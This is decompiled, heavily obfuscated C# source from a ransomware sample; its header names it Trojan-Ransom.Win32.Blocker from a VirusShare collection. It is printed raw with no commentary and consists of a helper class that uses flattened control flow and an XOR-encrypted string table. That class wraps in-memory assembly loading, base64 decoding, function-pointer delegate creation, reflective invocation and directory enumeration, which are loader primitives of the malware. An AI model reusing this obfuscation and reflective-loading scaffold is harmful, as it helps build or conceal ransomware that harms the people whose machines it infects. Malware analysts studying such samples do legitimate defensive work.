// Decompiled with JetBrains decompiler
// Type: SmartAssembly.Attributes.Ⴓ
// Assembly: yzalr14k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73F4068F-A403-47FB-B5CB-C14B2659D9D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jvnh-1a7b6e0d12ac2336ab057d2b6e6b7694d384e5bc974736cb0a175e5c77f3e4e4.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Threading;

namespace SmartAssembly.Attributes
{
  internal sealed class Ⴓ
  {
    internal static string Ⴀ([In] char obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 1:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
          case 2:
            num2 = 6;
            continue;
          case 4:
          case 6:
            goto label_3;
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴀ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return Conversions.ToString(obj0);
    }

    internal static void Ⴅ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 3;
            continue;
          case 1:
          case 5:
            goto label_7;
          case 2:
            goto label_8;
          case 4:
            goto label_9;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 99:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.SetData(obj1, obj2);
    }

    internal static bool Ⴐ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 95:
          num1 = 6;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_3;
          case 1:
          case 6:
          case 7:
            goto label_8;
          case 4:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴐ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Directory.Exists(obj0);
    }

    internal static Evidence Ⴈ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 13:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 7:
            goto label_8;
          case 3:
          case 6:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴈ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.Evidence;
    }

    internal static object Ⴗ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 92:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
          case 4:
            goto label_8;
          case 2:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          case 6:
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴗ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.GetObject(obj1);
    }

    internal static void Ⴓ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 5:
            goto label_7;
          case 4:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 120:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      ProjectData.SetProjectError(obj0);
    }

    internal static int Ⴄ([In] ref IntPtr obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 99:
          num1 = 6;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 6:
            goto label_8;
          case 1:
            num2 = 7;
            continue;
          case 4:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴄ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.ToInt32();
    }

    internal static char Ⴍ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 75:
          num1 = 2;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_3;
          case 1:
          case 2:
            goto label_8;
          case 4:
            num2 = 3;
            continue;
          case 5:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴍ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0[obj1];
    }

    internal static Delegate Ⴜ([In] IntPtr obj0, [In] Type obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 116:
          num1 = 6;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_3;
          case 4:
            num2 = 3;
            continue;
          case 5:
          case 6:
            goto label_8;
          case 7:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴜ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return Marshal.GetDelegateForFunctionPointer(obj0, obj1);
    }

    internal static MethodInfo ႥႠ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 87:
          num1 = 6;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_3;
          case 1:
          case 4:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.ႥႠ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.EntryPoint;
    }

    internal static void ႥႥ([In] int obj0, [In] int obj1)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 5;
            continue;
          case 1:
            goto label_7;
          case 2:
            goto label_8;
          default:
            int num2;
            switch (obj1 ^ obj0)
            {
              case 40:
                num2 = 1;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      ProjectData.ClearProjectError();
    }

    internal static byte[] ႥႰ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 37:
          num1 = 2;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 4:
          case 6:
            goto label_8;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.ႥႰ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.ToArray();
    }

    internal sealed class Ⴃ
    {
      private static readonly char[] ႰႠ;
      private static readonly char[] ႰႰ;
      private static readonly string[] ႰႥ;
      internal static SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႣ ႰႤ;

      static Ⴃ()
      {
        int num = 6;
        char[] chArray;
        while (true)
        {
          switch (num)
          {
            case 0:
              chArray = new char[8]
              {
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                '㒰',
                char.MinValue
              };
              goto case 2;
            case 1:
              chArray[7] = '▓';
              chArray[5] = '⋧';
              chArray[4] = 'ᾬ';
              num = 5;
              continue;
            case 2:
            case 3:
              num = 1;
              continue;
            case 4:
              goto label_7;
            case 5:
              chArray[3] = '㈀';
              chArray[1] = '⭘';
              chArray[0] = '㌅';
              num = 4;
              continue;
            default:
              SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႰ = new char[39]
              {
                char.MinValue,
                '$',
                char.MinValue,
                '㍤',
                '⬼',
                '\u0A58',
                '㉢',
                '῍',
                '⊂',
                '㒉',
                '▫',
                '㌨',
                '⬼',
                'ਁ',
                '㉤',
                'ᾜ',
                '⋊',
                '㒄',
                '▦',
                '㌵',
                '⬺',
                '੍',
                '㉡',
                'Ὲ',
                '⊆',
                '㒅',
                '▾',
                '㍡',
                '⬺',
                'ਁ',
                '㉥',
                '῎',
                '⊅',
                '㓖',
                '▥',
                '㍠',
                '⬹',
                '\u0A04',
                '㈸'
              };
              goto case 0;
          }
        }
label_7:
        chArray[2] = '\u0A60';
        SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႥ = new string[1];
        SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႠ = chArray;
      }

      internal static char Ⴐ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 9:
            num1 = 0;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_8;
            case 1:
            case 3:
              num2 = 4;
              continue;
            case 4:
            case 5:
              goto label_3;
            case 6:
            case 7:
              num2 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴐ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return Conversions.ToChar(obj0);
      }

      internal static Assembly Ⴅ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 60:
            num1 = 4;
            break;
          case 61:
            num1 = 6;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              num2 = 5;
              continue;
            case 3:
              num2 = 5;
              continue;
            case 4:
            case 7:
              goto label_9;
            case 5:
              goto label_3;
            case 6:
            case 8:
              goto label_10;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴅ);
              num2 = 5;
              continue;
          }
        }
label_9:
        return Assembly.GetEntryAssembly();
label_10:
        return Assembly.GetExecutingAssembly();
      }

      internal static int Ⴃ([In] ref Color obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 92:
            num1 = 4;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              num2 = 5;
              continue;
            case 3:
            case 4:
            case 7:
              goto label_8;
            case 5:
              goto label_3;
            case 6:
              num2 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴃ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.ToArgb();
      }

      internal static Assembly Ⴄ([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 104:
            num1 = 6;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_8;
            case 1:
            case 7:
              num2 = 5;
              continue;
            case 2:
            case 5:
              goto label_3;
            case 3:
              num2 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴄ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return Assembly.Load(obj0);
      }

      internal static char Ⴓ([In] int obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 107:
            num1 = 0;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
            case 6:
              goto label_8;
            case 2:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 4:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴓ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Convert.ToChar(obj0);
      }

      internal static string[] Ⴍ([In] string obj0, [In] char[] obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 111:
            num1 = 0;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_8;
            case 1:
            case 5:
            case 6:
              num2 = 7;
              continue;
            case 3:
            case 4:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴍ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.Split(obj1);
      }

      internal static object Ⴈ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 10:
            num1 = 4;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_8;
            case 2:
            case 5:
              goto label_3;
            case 3:
            case 6:
              num2 = 2;
              continue;
            case 7:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴈ);
              num2 = 2;
              continue;
          }
        }
label_8:
        return obj0.GetData(obj1);
      }

      internal static Assembly Ⴗ(
        [In] byte[] obj0,
        [In] byte[] obj1,
        [In] Evidence obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_3:
        int num1;
        switch (obj4 ^ obj3)
        {
          case 93:
            num1 = 7;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 7:
              goto label_8;
            case 3:
              num2 = 4;
              continue;
            case 4:
            case 6:
              goto label_3;
            case 5:
              num2 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴗ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return Assembly.Load(obj0, obj1, obj2);
      }

      internal static string Ⴜ([In] int obj0, [In] int obj1)
      {
label_3:
        int index1 = obj0 ^ 1272621946 ^ obj1;
label_4:
        char[] ⴐⴐ = SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႰ;
        int index2 = (int) ⴐⴐ[index1];
        int num1 = 8;
        string str1;
        int length1;
        char[] chArray;
        char[] ⴐⴀ;
        int length2;
        int index3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_14;
            case 1:
              chArray[index3] = (char) ((uint) ⴐⴐ[index1 + index3] ^ (uint) ⴐⴀ[(index3 + index2) % length2]);
              num1 = 10;
              continue;
            case 2:
              chArray = new char[length1];
              ⴐⴀ = SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႠ;
              length2 = ⴐⴀ.Length;
              index1 += 3;
              num1 = 9;
              continue;
            case 3:
              goto label_4;
            case 4:
            case 6:
              goto label_6;
            case 5:
              goto label_3;
            case 7:
              int num2 = (int) ⴐⴐ[index1 + 1];
              length1 = ((int) ⴐⴐ[index1 + 2] << 16) + num2;
              goto case 13;
            case 8:
              num1 = (str1 = SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႥ[index2]) == null ? 7 : 6;
              continue;
            case 9:
              index3 = 0;
              num1 = 12;
              continue;
            case 10:
              index3 = 1 + index3;
              num1 = 12;
              continue;
            case 12:
              num1 = index3 < length1 ? 1 : 0;
              continue;
            case 13:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴜ);
              num1 = 5;
              continue;
          }
        }
label_6:
        return str1;
label_14:
        string str2 = new string(chArray);
        SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႥ[index2] = str2;
        return str2;
      }

      internal static byte[] ႰႳ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 72:
            num1 = 1;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 7;
              continue;
            case 1:
            case 5:
            case 6:
              goto label_8;
            case 2:
              num2 = 7;
              continue;
            case 3:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႳ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return Convert.FromBase64String(obj0);
      }

      internal static string[] ႰႭ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 4:
            num1 = 5;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              num2 = 4;
              continue;
            case 1:
            case 2:
              num2 = 4;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.ႰႭ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return Directory.GetDirectories(obj0);
      }

      internal sealed class Ⴀ
      {
        internal static int Ⴅ([In] string obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 114:
              num1 = 1;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 2;
                continue;
              case 1:
              case 5:
                goto label_8;
              case 2:
              case 6:
                goto label_3;
              case 3:
              case 7:
                num2 = 2;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴅ);
                num2 = 2;
                continue;
            }
          }
label_8:
          return obj0.Length;
        }

        internal static object Ⴐ([In] MethodBase obj0, [In] object obj1, [In] object[] obj2, [In] int obj3, [In] int obj4)
        {
label_3:
          int num1;
          switch (obj4 ^ obj3)
          {
            case 80:
              num1 = 1;
              break;
            default:
              num1 = 7;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
              case 6:
                goto label_8;
              case 3:
                num2 = 4;
                continue;
              case 4:
                goto label_3;
              case 7:
                num2 = 4;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴐ);
                num2 = 4;
                continue;
            }
          }
label_8:
          return obj0.Invoke(obj1, obj2);
        }

        internal static Exception Ⴍ([In] int obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 98:
              num1 = 1;
              break;
            default:
              num1 = 5;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 1:
              case 3:
                goto label_8;
              case 2:
                goto label_3;
              case 5:
              case 6:
                num2 = 2;
                continue;
              case 7:
                num2 = 2;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴍ);
                num2 = 2;
                continue;
            }
          }
label_8:
          return ProjectData.CreateProjectError(obj0);
        }

        internal static byte Ⴈ([In] ref Color obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 105:
              num1 = 8;
              break;
            case 106:
              num1 = 9;
              break;
            case 107:
              num1 = 4;
              break;
            case 108:
              num1 = 7;
              break;
            default:
              num1 = 6;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 2;
                continue;
              case 1:
              case 4:
                goto label_13;
              case 2:
                goto label_3;
              case 5:
              case 8:
                goto label_11;
              case 6:
                num2 = 2;
                continue;
              case 7:
              case 10:
                goto label_14;
              case 9:
                goto label_12;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴈ);
                num2 = 2;
                continue;
            }
          }
label_11:
          return obj0.R;
label_12:
          return obj0.A;
label_13:
          return obj0.B;
label_14:
          return obj0.G;
        }

        internal static short Ⴃ([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 53:
              num1 = 5;
              break;
            default:
              num1 = 7;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 6;
                continue;
              case 2:
              case 5:
                goto label_8;
              case 3:
              case 7:
                num2 = 6;
                continue;
              case 4:
              case 6:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴃ);
                num2 = 6;
                continue;
            }
          }
label_8:
          return BitConverter.ToInt16(obj0, obj1);
        }

        internal static object Ⴄ([In] object obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 88:
              num1 = 3;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 4;
                continue;
              case 1:
              case 2:
              case 3:
                goto label_8;
              case 4:
                goto label_3;
              case 5:
                num2 = 4;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴄ);
                num2 = 4;
                continue;
            }
          }
label_8:
          return RuntimeHelpers.GetObjectValue(obj0);
        }

        internal static void Ⴀ([In] object obj0, [In] int obj1, [In] int obj2)
        {
          int num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 2:
                goto label_9;
              case 3:
                goto label_10;
              case 4:
                num1 = 1;
                continue;
              case 5:
                goto label_7;
              default:
                int num2;
                switch (obj2 ^ obj1)
                {
                  case 124:
                    num2 = 5;
                    break;
                  case 125:
                    goto label_8;
                  default:
                    num2 = 4;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_9:
          return;
label_10:
          return;
label_7:
          Monitor.Enter(obj0);
          return;
label_8:
          Monitor.Exit(obj0);
        }

        internal static string Ⴗ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 76:
              num1 = 6;
              break;
            default:
              num1 = 4;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                goto label_3;
              case 1:
              case 6:
                goto label_8;
              case 2:
                num2 = 0;
                continue;
              case 4:
                num2 = 0;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴗ);
                num2 = 0;
                continue;
            }
          }
label_8:
          return obj0.Name;
        }

        internal static string Ⴓ([In] string obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 22:
              num1 = 4;
              break;
            default:
              num1 = 6;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                goto label_3;
              case 2:
              case 4:
                goto label_8;
              case 5:
                num2 = 0;
                continue;
              case 6:
                num2 = 0;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴓ);
                num2 = 0;
                continue;
            }
          }
label_8:
          return obj0.ToLower();
        }
      }

      [StructLayout(LayoutKind.Explicit, Size = 78, Pack = 1)]
      private struct ႰႣ
      {
      }
    }
  }
}
